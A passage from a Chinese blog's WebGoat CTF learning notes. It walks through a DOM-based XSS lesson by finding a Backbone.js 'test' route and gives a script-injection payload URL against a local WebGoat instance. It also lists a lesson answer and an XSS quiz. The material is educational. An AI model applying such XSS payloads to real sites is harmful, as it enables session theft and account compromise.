<p><a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/backbone-js-doc-112/content/6.html">Backbone.Router（路由） | Backbone.js 中文文档 1.1.2 (gitbooks.io)</a></p>
<p>它题目的案例写的很清楚</p>
<p>查看本课的 URL … 它应类似于 /WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/9。在这种情况下，“基本路线”是： 开始.mvc#lesson/ 之后的 CrossSiteScripting.lesson/9 是由 JavaScript 路由处理程序处理的参数。</p>
<p>这里我们需要找test code</p>
<p>先用f12去看调试器中的（来源）resource，一个一个慢慢找就能看到GoatRouter，里面有</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var GoatAppRouter = Backbone.Router.extend(&#123;</span><br><span class="line"></span><br><span class="line">     routes: &#123;</span><br><span class="line">        &#x27;welcome&#x27;: &#x27;welcomeRoute&#x27;,</span><br><span class="line">        &#x27;lesson/:name&#x27;: &#x27;lessonRoute&#x27;,</span><br><span class="line">        &#x27;lesson/:name/:pageNum&#x27;: &#x27;lessonPageRoute&#x27;,</span><br><span class="line">        &#x27;test/:param&#x27;: &#x27;testRoute&#x27;,</span><br><span class="line">        &#x27;reportCard&#x27;: &#x27;reportCard&#x27;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>extend</strong><code>Backbone.Router.extend(properties, [classProperties])</code> 开始创建一个自定义的路由类。当匹配了 URL 片段便执行定义的动作，并可以通过 <a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/backbone-js-doc-112/content/6.html#Router-routes">routes</a> 定义路由动作键值对。 请注意，你要避免在路由定义时使用前导斜杠</p>
</blockquote>
<p>所以这里答案就是直接<code>start.mvc#test</code></p>
<h3 id="11-4">11.</h3>
<p>这里就是利用test进行xss攻击</p>
<p>题目给的<code>webgoat.customjs.phoneHome()</code>是会返回一个随机数</p>
<p>直接构建payload</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome()%3C%2fscript%3E</span><br></pre></td></tr></table></figure>
<p>在f12的console里面可以看到随机数，填入就行了</p>
<h3 id="12-3">12</h3>
<p>答案试43124</p>
<blockquote>
<ol>
<li>
<p>可信网站是否能抵御XSS攻击？<br>
解决方案 1：是的，它们是安全的，因为浏览器在执行之前会检查代码。<br>
解决方案 2：是的，因为 Google 有一种阻止恶意代码的算法。<br>
解决方案3：否，因为执行的脚本会突破浏览器的防御算法。<br>
解决方案 4：否，因为浏览器信任该网站，如果它被确认为受信任，则浏览器不知道该脚本是恶意的。</p>
</li>
<li>
<p>XSS攻击何时发生？<br>
解决方案 1：数据通过受信任的源进入 Web 应用程序。<br>
解决方案 2：数据通过网站进入浏览器应用程序。<br>
解决方案 3：数据包含在发送给 Web 用户的动态内容中，而未验证恶意内容。<br>
解决方案 4：数据在静态内容中被排除在外，即在未经验证的情况下发送数据。</p>
</li>
<li>
<p>什么是存储型XSS攻击？<br>
解决方案 1：脚本永久存储在服务器上，受害者在向服务器请求信息时获取恶意脚本。<br>
解决方案 2：该脚本将自身存储在受害者的计算机上，并在本地执行恶意代码。<br>
解决方案 3：该脚本将病毒存储在受害者的计算机上。攻击者现在可以执行各种操作。<br>
解决方案 4：脚本存储在浏览器中，并向攻击者发送信息。</p>
</li>
<li>
<p>什么是反射式 XSS 攻击？<br>
解决方案 1：反射攻击将恶意代码从数据库反射到 Web 服务器，然后将其反射回用户。<br>
解决方案 2：它们将注入的脚本反映在 Web 服务器之外。当发送到 Web 服务器的输入是请求的一部分时，就会发生这种情况。<br>
解决方案 3：反射式攻击从防火墙反射到用户从中请求信息的数据库。<br>
解决方案 4：反射型 XSS 是一种攻击，其中注入的脚本从数据库和 Web 服务器反射到用户。</p>
</li>
<li>
<p>JavaScript 是执行 XSS 攻击的唯一方法吗？<br>
解决方案 1：是的，您只能通过 JavaScript 使用标签。<br>
解决方案 2：是的，否则您无法窃取 cookie。<br>
解决方案 3：不，也有 ECMAScript。<br>
解决方案4：不，还有很多其他方法。如 HTML、Flash 或浏览器执行的任何其他类型的代码。</p>
</li>
</ol>
</blockquote>
<h2 id="9-Insecure-Deserialization">9.Insecure Deserialization</h2>
<h2 id="10-Vulnerable-Components">10.Vulnerable Components</h2>
<h2 id="11-Request-Forgeries">11.Request Forgeries</h2>
<h2 id="12-Client-side">12.Client side</h2>
<h2 id="13-Challenges">13.Challenges</h2>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>CTF之WebGoat学习记录</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://nonevector.top/posts/19.html">https://nonevector.top/posts/19.html</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>NoneVector</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2023-12-10</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-01-07</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WebGoat/"><div class="tags-punctuation"><svg class="faa-tada icon" style="height:1.1em;width:1.1em;fill:currentColor;position:relative;top:2px;margin-right:3px" aria-hidden="true"><use xlink:href="#icon-sekuaibiaoqian"></use></svg></div>WebGoat</a></div></div><link rel="stylesheet" href="/css/coin.css" media="defer" onload="this.media='all'"/><div class="post-reward"><button class="tip-button reward-button"><span class="tip-button__text">投喂作者</span><div class="coin-wrapper"><div class="coin"><div class="coin__middle"></div><div class="coin__back"></div><div class="coin__front"></div></div></div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://nonevector.top/assets/ganyu_happy.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://nonevector.top/assets/ganyu_happy.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://nonevector.top/assets/kelee.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://nonevector.top/assets/kelee.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></button></div><audio id="coinAudio" src="https://npm.elemecdn.com/akilar-candyassets@1.0.36/audio/aowu.m4a"></audio><script defer="defer" src="/js/coin.js"></script><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/18.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/anmi/Pixiv/55019698_p0.jpg" onerror="onerror=null;src='/assets/r2.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">dirsearch</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><svg class="meta_icon" style="width:22px;height:22px;position:relative;top:5px"><use xlink:href="#icon-mulu1"></use></svg><span style="font-weight:bold">目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-text">安装+环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%B7%A5%E5%85%B7"><span class="toc-text">常用命令和工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E7%BF%BB%E8%AF%91%E8%BD%AF%E4%BB%B6"><span class="toc-text">0.翻译软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-curl"><span class="toc-text">1.curl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-burp"><span class="toc-text">2.burp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-F12"><span class="toc-text">3.F12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-dirsearch"><span class="toc-text">4.dirsearch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-GitHack"><span class="toc-text">5.GitHack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-dvcs-ripper"><span class="toc-text">6.dvcs-ripper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-password"><span class="toc-text">7.password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E7%BC%96%E7%A0%81-%E8%A7%A3%E7%A0%81%E5%B7%A5%E5%85%B7"><span class="toc-text">8.编码&#x2F;解码工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Introduction"><span class="toc-text">1.Introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-WebGoat"><span class="toc-text">1.WebGoat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-WebWolf"><span class="toc-text">2.WebWolf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Introducing-WebWolf"><span class="toc-text">1.Introducing WebWolf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Uploading-files"><span class="toc-text">2.Uploading files</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Your-own-mailbox"><span class="toc-text">3.Your own mailbox</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Landing-page"><span class="toc-text">4.Landing page</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-General"><span class="toc-text">2.General</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-HTTP-Basics"><span class="toc-text">1.HTTP Basics</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3"><span class="toc-text">3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-HTTP-Proxies"><span class="toc-text">2.HTTP Proxies</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6"><span class="toc-text">6</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Developer-Tools"><span class="toc-text">3.Developer Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4"><span class="toc-text">4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2"><span class="toc-text">6</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-CIA-Triad"><span class="toc-text">4.CIA Triad</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5"><span class="toc-text">5</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Crypto-Basics"><span class="toc-text">5.Crypto Basics</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Base64-Encoding"><span class="toc-text">2.Base64 Encoding</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Other-Encoding"><span class="toc-text">3.Other Encoding</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Hashing"><span class="toc-text">4.Hashing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8"><span class="toc-text">8.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Writing-new-lesson"><span class="toc-text">6.Writing new lesson</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Injection"><span class="toc-text">3.Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SQL-Injection-intro-%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E7%AE%80%E5%8D%95%E7%89%88%EF%BC%89"><span class="toc-text">1.SQL Injection(intro)（SQL注入-简单版）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2"><span class="toc-text">2.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2"><span class="toc-text">3.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9"><span class="toc-text">9.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10"><span class="toc-text">10.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11"><span class="toc-text">11.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12"><span class="toc-text">12.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13"><span class="toc-text">13.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SQL-injection-advanced-%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E9%AB%98%E7%BA%A7%E7%89%88%EF%BC%89"><span class="toc-text">2.SQL injection(advanced)（SQL注入-高级版）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3"><span class="toc-text">3.</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%86%99%E6%B3%95"><span class="toc-text">第一种写法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%86%99%E6%B3%95"><span class="toc-text">第二种写法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-4"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-3"><span class="toc-text">6.</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1"><span class="toc-text">1.</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3"><span class="toc-text">2.</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-4"><span class="toc-text">3.</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-3"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-5"><span class="toc-text">5.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SQL-Injection-mitigation-%EF%BC%88SQL%E6%B3%A8%E5%85%A5%E7%BC%93%E8%A7%A3%EF%BC%89"><span class="toc-text">3.SQL Injection(mitigation)（SQL注入缓解）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4"><span class="toc-text">1-4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-6"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-4"><span class="toc-text">6.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7"><span class="toc-text">7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-2"><span class="toc-text">9.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-2"><span class="toc-text">10.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-2"><span class="toc-text">12.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Path-traversal-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86"><span class="toc-text">4.Path traversal(路径遍历)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2"><span class="toc-text">1.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4"><span class="toc-text">2.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5"><span class="toc-text">3.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-7"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-2"><span class="toc-text">7.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Broken-Authentication%EF%BC%88%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">4.Broken Authentication（身份验证绕过）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Authentication-Bypass%EF%BC%88%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">1.Authentication Bypass（身份验证绕过）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3"><span class="toc-text">1.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5"><span class="toc-text">2.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-JWT-tokens"><span class="toc-text">2.JWT tokens</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Json-Web-Token"><span class="toc-text">1.Json Web Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJWT"><span class="toc-text">什么是JWT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JWT-%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">JWT 的原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JWT-%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-text">JWT 的数据结构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Header"><span class="toc-text">Header</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Payload"><span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Signature"><span class="toc-text">Signature</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-8"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-5"><span class="toc-text">6.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-3"><span class="toc-text">7.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-2"><span class="toc-text">8.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-3"><span class="toc-text">10.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-2"><span class="toc-text">11.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Password-reset%EF%BC%88%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%EF%BC%89"><span class="toc-text">3.Password reset（密码重置）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-6"><span class="toc-text">2.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-5"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-9"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-6"><span class="toc-text">6.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Secure-Passwords%EF%BC%88%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8%EF%BC%89"><span class="toc-text">4.Secure Passwords（密码安全）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6"><span class="toc-text">4.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Sensitive-Data-Exposure%EF%BC%88%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%9A%B4%E9%9C%B2%EF%BC%89"><span class="toc-text">5.Sensitive Data Exposure（敏感数据暴露）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Insecure-Login%EF%BC%88%E4%B8%8D%E5%AE%89%E5%85%A8%E7%99%BB%E5%BD%95%EF%BC%89"><span class="toc-text">1.Insecure Login（不安全登录）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-7"><span class="toc-text">2.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-XML-External-Entities%EF%BC%88XXE%EF%BC%89%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%EF%BC%89"><span class="toc-text">6.XML External Entities（XXE）（XML外部实体）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-text">0 基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0-XML%E5%9F%BA%E7%A1%80"><span class="toc-text">0.XML基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-XML%E6%A0%87%E7%AD%BE"><span class="toc-text">1.XML标签</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%AF%8F%E4%B8%AA%E6%9E%84%E5%BB%BA%E6%A8%A1%E5%9D%97%E7%9A%84%E7%AE%80%E8%A6%81%E6%8F%8F%E8%BF%B0"><span class="toc-text">1.每个构建模块的简要描述</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E5%85%83%E7%B4%A0"><span class="toc-text">1. 元素</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E5%B1%9E%E6%80%A7"><span class="toc-text">2. 属性</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E5%AE%9E%E4%BD%93"><span class="toc-text">3. 实体</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-PCDATA"><span class="toc-text">4. PCDATA</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5-CDATA"><span class="toc-text">5. CDATA</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-XML%E8%AF%AD%E6%B3%95%E8%A7%84%E5%88%99"><span class="toc-text">2.XML语法规则</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-DTD"><span class="toc-text">2.DTD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AE%9E%E4%BD%93-2"><span class="toc-text">3.实体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="toc-text">4.XML外部实体注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3"><span class="toc-text">1-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-6"><span class="toc-text">5-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4"><span class="toc-text">7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3"><span class="toc-text">8.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-3"><span class="toc-text">9.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-4"><span class="toc-text">10.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-3"><span class="toc-text">11.</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%96%91%E9%97%AE%EF%BC%9A"><span class="toc-text">疑问：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-13"><span class="toc-text">12-13</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-Broken-Access-Control%EF%BC%88%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%B8%AD%E6%96%AD%EF%BC%89"><span class="toc-text">7.Broken Access Control（访问控制中断）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Insecure-Direct-Object-References%EF%BC%88%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%9B%B4%E6%8E%A5%E5%BC%95%E7%94%A8%E5%AF%B9%E8%B1%A1%EF%BC%89"><span class="toc-text">1.Insecure Direct Object References（不安全的直接引用对象）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4"><span class="toc-text">1.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-8"><span class="toc-text">2.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-6"><span class="toc-text">3.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-8"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-10"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-7"><span class="toc-text">6.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Missing-Function-Level-Access-Control%EF%BC%88%E7%BC%BA%E5%B0%91%E5%8A%9F%E8%83%BD%E7%BA%A7%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%89"><span class="toc-text">2.Missing Function Level Access Control（缺少功能级访问控制）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-9"><span class="toc-text">2.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-7"><span class="toc-text">3.</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%AE%80%E5%8D%95%E5%81%9A%E6%B3%95"><span class="toc-text">1.简单做法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%BF%9B%E9%98%B6%E5%81%9A%E6%B3%95"><span class="toc-text">2.进阶做法</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-Cross-Site-Scripting-XSS"><span class="toc-text">8.Cross-Site Scripting(XSS)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-10"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-8"><span class="toc-text">3.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-9"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-11"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-5"><span class="toc-text">7.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-4"><span class="toc-text">9.</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-color: transparent;"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">格言🧬</p><div class="bg-ad"><div>再看看那个光点，它就在这里，这是家园，这是我们 —— 你所爱的每一个人，你认识的一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨</div><div class="btn-xz-box"><a class="btn-xz" target="_blank" rel="noopener" href="https://stellarium.org/">点击开启星辰之旅</a></div></div></div><div class="t-t-r"><p class="ft-t t-l-t">猜你想看💡</p><ul class="ft-links"><li><a href="/life/music">听点音乐</a><a href="/box/nav/">网址导航</a></li><li><a href="/social/link/">我的朋友</a><a href="/comments/">留点什么</a></li><li><a href="/personal/about/">关于作者</a><a href="/archives/">文章归档</a></li><li><a href="/categories/">文章分类</a><a href="/tags/">文章标签</a></li><li><a href="/box/gallery/">我的画廊</a><a href="/personal/bb/">我的唠叨</a></li><li><a href="/site/time/">建设进程</a><a href="/site/census/">网站统计</a></li></ul></div></div></div><div class="ft-item-2"><p class="ft-t">推荐友链⌛</p><div class="ft-img-group"><div class="img-group-item"><a target="_blank" rel="noopener" href="https://www.fomal.cc/" title="Fomalhaut🥝"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://www.fomal.cc/assets/avatar.webp" alt=""/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://nullpointer.top/" title="和光同尘"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://www.nullpointer.top/img/avatar_hu63c7d7d33625004ecc1bebcc651d1be3_23616_300x0_resize_q75_box.jpg" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= 